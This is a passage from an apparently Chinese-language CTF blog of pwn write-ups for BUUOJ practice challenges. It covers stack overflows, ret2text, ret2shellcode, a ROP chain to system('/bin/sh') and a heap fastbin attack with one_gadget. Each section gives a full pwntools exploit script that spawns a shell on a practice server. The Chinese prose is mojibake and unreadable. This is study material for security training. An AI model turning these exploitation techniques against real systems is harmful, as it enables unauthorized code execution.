class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¾—flag</p><p><img src="https://i.loli.net/2020/09/21/P4QqLJyplu2xF9r.png" alt="image.png"></p><blockquote><p>å¥½å¤šä¸€æ ·çš„é¢˜å•ŠOr2</p></blockquote><h1 id="0x012-bjdctf-2020-babystack-ret2text"><a href="#0x012-bjdctf-2020-babystack-ret2text" class="headerlink" title="0x012.bjdctf_2020_babystack - ret2text"></a>0x012.bjdctf_2020_babystack - ret2text</h1><blockquote><p>åˆæ˜¯ä¸€æ¨¡ä¸€æ ·çš„é¢˜ã€‚ã€‚ã€‚</p></blockquote><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/21/DQAdo9gNevJrtBz.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/09/21/L5gZjv1rh3bIEt7.png" alt="image.png"></p><p>ä¸»å‡½æ•°ä¸­ç”¨æˆ·å¯ä»¥æ§åˆ¶è¯»å…¥çš„å­—ç¬¦æ•°é‡ï¼Œå­˜åœ¨æº¢å‡º</p><p>åŒæ—¶å­˜åœ¨å¯ä»¥getshellçš„<code>backdoor()</code>å‡½æ•°</p><p><img src="https://i.loli.net/2020/09/21/GMBR1ib9dHNxlPX.png" alt="image.png"></p><p>æ•…è€ƒè™‘æ„é€ ropé“¾æ‰§è¡Œ<code>backdoor()</code>å‡½æ•°å³å¯</p><p>æ„é€ expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x4006e6</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25806</span>)<span class="comment">#p = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;100&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p><img src="https://i.loli.net/2020/09/21/nBZbpiVdHPRvu9c.png" alt="image.png"></p><h1 id="0x013-babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget"><a href="#0x013-babyheap-0ctf-2017-Unsorted-bin-leak-Fastbin-Attack-one-gadget" class="headerlink" title="0x013.babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget"></a>0x013.babyheap_0ctf_2017 - Unsorted bin leak + Fastbin Attack + one_gadget</h1><blockquote><p>æ¥åˆ°BUUååšçš„ç¬¬ä¸€é“å †é¢˜</p></blockquote><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼ˆ<strong>å¿ƒ è‚º åœ æ­¢</strong></p><p><img src="https://i.loli.net/2020/09/21/aZJExgI4UqDuPoj.png" alt="image.png"></p><p>æ‹–å…¥IDAé‡Œè¿›è¡Œåˆ†æï¼ˆä»¥ä¸‹éƒ¨åˆ†å‡½æ•°ã€å˜é‡åç»è¿‡é‡å‘½åï¼‰</p><p>å¸¸è§çš„å †é¢˜åŸºæœ¬ä¸Šéƒ½æ˜¯èœå•é¢˜ï¼Œæœ¬é¢˜ä¹Ÿä¸ä¾‹å¤–<img src="https://i.loli.net/2020/09/30/VEjFKYhibtqHfs6.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>writeHeap()</code>å‡½æ•°ä¸­å¹¶æ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„é•¿åº¦è¿›è¡Œæ£€æŸ¥ï¼Œ<strong>å­˜åœ¨å †æº¢å‡º</strong></p><p><img src="https://i.loli.net/2020/09/30/WAOCpdZMVRlSxgm.png" alt="image.png"></p><p>æ•…æˆ‘ä»¬è€ƒè™‘å…ˆåˆ›å»ºå‡ ä¸ªå°å †å—ï¼Œå†åˆ›å»ºä¸€ä¸ªå¤§å †å—ï¼Œfreeæ‰ä¸¤ä¸ªå°å †å—è¿›å…¥åˆ°fastbinï¼Œç”¨å †æº¢å‡ºæ”¹å†™fastbinç¬¬ä¸€ä¸ªå—çš„fdæŒ‡é’ˆä¸ºæˆ‘ä»¬æ‰€ç”³è¯·çš„å¤§å †å—çš„åœ°å€ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯fastbinä¼šå¯¹chunkçš„sizeè¿›è¡Œæ£€æŸ¥ï¼Œæ•…æˆ‘ä»¬è¿˜éœ€è¦å…ˆé€šè¿‡å †æº¢å‡ºæ”¹å†™å¤§å †å—çš„sizeï¼Œä¹‹åå°†å¤§å †å—åˆ†é…å›æ¥åæˆ‘ä»¬å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå †å—</p><p><img src="https://i.loli.net/2020/10/07/XARM5QmBzFadtWi.png" alt="62DB8B2E56B87418664EEB947A980782.png"></p><p>åˆ©ç”¨å †æº¢å‡ºå°†å¤§å †å—çš„sizeé‡æ–°æ”¹å¤§å†freeä»¥é€å…¥unsorted binï¼Œæ­¤æ—¶å¤§å †å—çš„fdä¸bkæŒ‡é’ˆæŒ‡å‘main_arena+0x58çš„ä½ç½®ï¼Œåˆ©ç”¨å¦å¤–ä¸€ä¸ªæŒ‡å‘è¯¥å¤§å †å—çš„æŒ‡é’ˆè¾“å‡ºfdçš„å†…å®¹å³å¯å¾—åˆ°main_arena+0x58çš„åœ°å€ï¼Œå°±å¯ä»¥ç®—å‡ºlibcçš„åŸºå€</p><p><img src="https://i.loli.net/2020/10/07/IBAZ6ChTOrQwonp.png" alt="72934A2F942430E796048F09C96A261F.png"></p><p>æ¥ä¸‹æ¥ä¾¿æ˜¯fastbin attackï¼šå°†æŸä¸ªå †å—é€å…¥fastbinåæ”¹å†™å…¶fdæŒ‡é’ˆä¸º__malloc_hookçš„åœ°å€ï¼ˆ__malloc_hookä½äºmain_arenaä¸Šæ–¹0x10å­—èŠ‚å¤„ï¼‰ï¼Œå†å°†è¯¥å †å—åˆ†é…å›æ¥ï¼Œæ­¤æ—¶fastbinä¸­è¯¥é“¾è¡¨ä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªæˆ‘ä»¬æ‰€ä¼ªé€ çš„ä½äº__malloc_hookä¸Šçš„å †å—ï¼Œç”³è¯·è¿™ä¸ªå †å—åæˆ‘ä»¬ä¾¿å¯ä»¥æ”¹å†™malloc_hookä¸Šçš„å†…å®¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œæœ€åéšä¾¿åˆ†é…ä¸€ä¸ªå †å—ä¾¿å¯getshell</p><p>è€ƒè™‘åˆ°é¢˜ç›®ä¸­å¹¶ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„åé—¨å‡½æ•°ï¼Œæ•…è€ƒè™‘ä½¿ç”¨one_gadgetä»¥getshell</p><p><img src="https://i.loli.net/2020/10/07/glLRkSdY3GufeOv.png" alt="D2D612904D8AB28F1DCCE651D4B81508.png"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯fastbinå­˜åœ¨sizeæ£€æŸ¥ï¼Œæ•…å…·ä½“çš„<strong>èƒ½å¤Ÿè®©fake chunkçš„sizeåˆšå¥½ä¸ºç‰¹å®šå€¼</strong>çš„é‚£ä¸ªåœ°å€å¯èƒ½ä½äº__malloc_hookä¸Šæ–¹çš„æŸä¸€å¤„ï¼Œéœ€è¦æˆ‘ä»¬å¤šæ¬¡å°è¯•å¾—åˆ°åç§»é‡</p><p>æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27143</span>)<span class="comment">#process(&#x27;./babyheap_0ctf_2017&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index:<span class="built_in">int</span>,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvline()</span><br><span class="line">    </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#idx1</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#idx2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx1, the former idx2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#idx2, the former idx4</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#idx5, prevent the top chunk combine it</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into unsorted bin, fd points to the main_arena</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x58</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment">#idx2 got into fastbin</span></span><br><span class="line">payload = p64(malloc_hook - <span class="number">0x23</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload) <span class="comment">#overwrite fd to fake chunk addr</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#idx6, our fake chunk</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13</span> + p64(one_gadget)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¾—flag</p><p><img src="https://i.loli.net/2020/10/07/9n7EyWL5OC3aIcm.png" alt="image.png"></p><h1 id="0x014-ciscn-2019-n-5-ret2shellcode"><a href="#0x014-ciscn-2019-n-5-ret2shellcode" class="headerlink" title="0x014.ciscn_2019_n_5 - ret2shellcode"></a>0x014.ciscn_2019_n_5 - ret2shellcode</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°è¿‘ä¹ä¿æŠ¤å…¨å…³ï¼Œæ•´æŒºå¥½</p><p><img src="https://i.loli.net/2020/10/09/6YLBG8h3kfrqEFl.png" alt="9FIY_KOU2UD64__0RB5U66B.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>![41L&#96;5F__UIYNB_H_YE_DEHD.png](<a href="https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png">https://i.loli.net/2020/10/09/zTYkWulo1hyLKvB.png</a>)</p><p>ä¸€å¼€å§‹å…ˆå‘bssæ®µä¸Šçš„<code>name</code>è¯»å…¥æœ€å¤§<code>0x64</code>å­—èŠ‚çš„å†…å®¹ï¼Œä¹‹åå†ä½¿ç”¨<code>gets()</code>è¯»å…¥åˆ°textä¸Šï¼Œå­˜åœ¨æ ˆæº¢å‡º</p><p>æ•…è€ƒè™‘å…ˆå‘<code>name</code>ä¸Šå†™å…¥shellcodeå†æ§åˆ¶ç¨‹åºè·³è½¬è‡³<code>name</code>å³å¯</p><p>bssæ®µä¸Š<code>name</code>çš„åœ°å€ä¸º<code>0x601080</code></p><p><img src="https://i.loli.net/2020/10/09/Il3iOrAao5phSXm.png" alt="3N50O64P@_TF@5SAT_@__KU.png"></p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0xdeadbeef</span>) + p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_5&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,27296)</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸgetshell</p><p><img src="https://i.loli.net/2020/10/09/kxmOadD1Py7GYLM.png" alt="ZGX5RGFHA_NTT96WDXA__4T.png"></p><h1 id="0x015-level2-x64-ret2csu"><a href="#0x015-level2-x64-ret2csu" class="headerlink" title="0x015.level2_x64 - ret2csu"></a>0x015.level2_x64 - ret2csu</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2020/10/09/wMdhOJgrpDZCicA.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/10/09/cusBMX2AOeT7yEt.png" alt="image.png"></p><p>åœ¨<code>vulnerable_function()</code>å¤„å­˜åœ¨æ ˆæº¢å‡ºï¼Œä¸”å­˜åœ¨<code>system()</code>å‡½æ•°</p><p><img src="https://i.loli.net/2020/10/09/hGbO9NaLnkory3I.png" alt="image.png"></p><p>åœ¨.dataæ®µå­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²</p><p>æ•…è€ƒè™‘æ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x600A90</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006B3</span></span><br><span class="line">call_sys = <span class="number">0x400603</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(call_sys)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level2_x64&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,26289)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¾—flag</p><p><img src="https://i.loli.net/2020/10/09/85mfFgLiZVYXeuN.png" alt="image.png"></p><h1 id="0x016-ciscn-2019-ne-5-ret2text"><a href="#0x016-ciscn-2019-ne-5-ret2text" class="headerlink" title="0x016.ciscn_2019_ne_5 - ret2text"></a>0x016.ciscn_2019_ne_5 - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2020/10/09/5Z3rzc8pPb61hjL.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/10/09/aqwxIRMizvbVkPF.png" alt="ZX9_6BVAK5A_V_BL__V_I0X.png"></p><p>çœ‹èµ·æ¥é•¿å¾—åƒå †é¢˜ä½†å…¶å®å®Œå…¨æ²¡æœ‰å †çš„æ“ä½œï¼Œè¿˜æ˜¯ä¼ ç»Ÿçš„æ ˆé¢˜</p><p>åœ¨<code>AddLog()</code>å‡½æ•°ä¸­è¯»å…¥æœ€å¤§128å­—èŠ‚åˆ°å­—ç¬¦ä¸²<code>src</code>ä¸­</p><p>![UXHLHKU0D9MFLEY3MJK_&#96;QT.png](<a href="https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png">https://i.loli.net/2020/10/09/TREtZOFSvhdqVup.png</a>)</p><p>åœ¨<code>GetFlag()</code>å‡½æ•°ä¸­ä¼šæ‹·è´<code>src</code>åˆ°<code>dest</code>ä¸Šï¼Œå­˜åœ¨æ ˆæº¢å‡º</p><p><img src="https://i.loli.net/2020/10/09/FHvp3yewxTmkG6Z.png" alt="_@SVK_64XY_UGE02KN_Q6_9.png"></p><p>åŒæ—¶ç¨‹åºä¸­å­˜åœ¨<code>system()</code>å‡½æ•°ä¸<code>sh</code>å­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2020/10/09/q8KI9ocLn1NybWz.png" alt="image.png"></p><p>![X0WS9USGGKI&#96;WCZK0_J80_7.png](<a href="https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png">https://i.loli.net/2020/10/09/a7OuQVLPsSAMd85.png</a>)</p><p>æ•…ç›´æ¥æº¢å‡ºæ§åˆ¶ç¨‹åºæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x80482ea</span></span><br><span class="line">call_sys = <span class="number">0x80486b9</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x48</span> + p32(<span class="number">0xdeadbeef</span>) + p32(call_sys)  + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)<span class="comment">#remote(&#x27;node3.buuoj.cn&#x27;,26005)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;administrator&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯getshell</p><p>![L_YGD&#96;OM1C_L_RJ~7__23SD.png](<a href="https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png">https://i.loli.net/2020/10/09/TUIEloeFPhfsXqC.png</a>)</p><h1 id="0x017-ciscn-2019-s-3-ret2csu-SROP"><a href="#0x017-ciscn-2019-s-3-ret2csu-SROP" class="headerlink" title="0x017.ciscn_2019_s_3 - ret2csu || SROP"></a>0x017.ciscn_2019_s_3 - ret2csu || SROP</h1><blockquote><p> åº”<a href="https://ll1ng.github.io/">æŸä½å¯çˆ±çš„å¥³å¸ˆå‚…</a>çš„è¦æ±‚å…ˆæ¥åšè¿™é“é¢˜ï¼ˆï¼ˆï¼ˆ</p></blockquote><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/13/ip9xYzyfsF8eSvU.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š<br><img src="https://i.loli.net/2020/09/13/QX6bdK57hjWCyrG.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/09/13/5RsPUNZAyV2ot7f.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>main()</code>å‡½æ•°ä¼šè°ƒç”¨<code>vuln()</code>å‡½æ•°ï¼Œåœ¨<code>vuln()</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨ä¸¤ä¸ª<strong>ç³»ç»Ÿè°ƒç”¨</strong>â€”â€”0å·ç³»ç»Ÿè°ƒç”¨<code>sys_read</code>è¯»å…¥æœ€å¤§<strong>0x400</strong>ä¸ªå­—èŠ‚åˆ°bufä¸Šï¼Œbufåªåˆ†é…åˆ°äº†<strong>0x10</strong>ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼›éšåè°ƒç”¨1å·ç³»ç»Ÿè°ƒç”¨<code>sys_write</code>è¾“å‡ºbufä¸Šçš„<strong>0x30</strong>å­—èŠ‚çš„å†…å®¹</p><p>åŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥è§‚å¯Ÿåˆ°æœ‰ä¸€ä¸ªæ²¡æœ‰è¢«ç”¨åˆ°çš„<code>gadget()</code>å‡½æ•°ï¼Œé‡Œé¢æœ‰ä¸¤æ¡gadget<strong>å°†raxè®¾ä¸º0xfæˆ–0x3b</strong>ï¼Œä¹Ÿå°±æ˜¯15æˆ–59</p><p><img src="https://i.loli.net/2020/09/13/eBiLZDC9uwRxvIP.png" alt="image.png"></p><p>è€Œ<code>syscall</code>æŒ‡ä»¤ä»<strong>raxå¯„å­˜å™¨</strong>ä¸­è¯»å–å€¼å¹¶è°ƒç”¨ç›¸å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆä»ç¨‹åºæœ¬èº«çš„ä»£ç æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹å‡ºè¿™ä¸€ç‚¹ï¼‰ï¼Œå¯¹åº”çš„æˆ‘ä»¬å¯ä»¥æƒ³åˆ°çš„æ˜¯è¿™ä¸ªgadgetè¦æˆ‘ä»¬é€šè¿‡ç›¸åº”çš„<strong>ç³»ç»Ÿè°ƒç”¨</strong>æ¥getshell</p><p>åœ¨64ä½Linuxä¸‹ï¼Œ15å·ç³»ç»Ÿè°ƒç”¨æ˜¯<strong>rt_sigreturn</strong>ï¼Œè€Œ59å·ç³»ç»Ÿè°ƒç”¨åˆ™æ˜¯æˆ‘ä»¬æ‰€ç†Ÿæ‚‰çš„<strong>execve</strong>ï¼Œ<del>é‚£ä¹ˆè¿™ä¸ªç³»ç»Ÿè°ƒç”¨è¯¥æ€ä¹ˆåˆ©ç”¨å‘¢æˆ‘æš‚ä¸”è’™åœ¨å¤é‡Œ</del></p><blockquote><p>ç³»ç»Ÿè°ƒç”¨ä¸€è§ˆè¡¨è§<a href="https://archive.next.arttnba3.cn/2000/10/12/%E3%80%90%E8%B5%84%E6%96%99%E5%AD%98%E6%A1%A3-0x01%E3%80%91Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88-by-arttnba3/">è¿™é‡Œ</a></p></blockquote><p>è€ƒè™‘åˆ°åœ¨<code>vuln()</code>å‡½æ•°ä¸­åªåˆ†é…äº†<code>0x10</code>ä¸ªå­—èŠ‚çš„ç©ºé—´ç»™bufï¼Œä½†æ˜¯åé¢çš„ç³»ç»Ÿè°ƒç”¨<code>write</code>ä¼šè¾“å‡º0x30ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œå³é™¤äº†æˆ‘ä»¬çš„è¾“å…¥ä¹‹å¤–è¿˜ä¼šæ‰“å°ä¸€äº›æ ˆä¸Šçš„å†…å®¹ï¼Œå…¶ä¸­å‰0x20ä¸ªå­—èŠ‚çš„å†…å®¹åˆ†åˆ«ä¸ºï¼š0x10å­—èŠ‚çš„bufã€8å­—èŠ‚çš„old_rbpï¼ˆä½œä¸ºè¿”å›åœ°å€ï¼‰ã€8å­—èŠ‚çš„mainå‡½æ•°ä¸­çš„<code>call vuln</code>æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œå‰©ä¸‹çš„0x10ä¸ªå­—èŠ‚åˆ™æ˜¯æ ˆä¸Šçš„ä¸€äº›å…¶ä»–çš„å†…å®¹</p><p>æˆ‘ä»¬ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•çœ‹çœ‹æ˜¯ä»€ä¹ˆå†…å®¹ï¼š</p><p><img src="https://i.loli.net/2020/09/14/TcMSfPtdDmQhuAC.png" 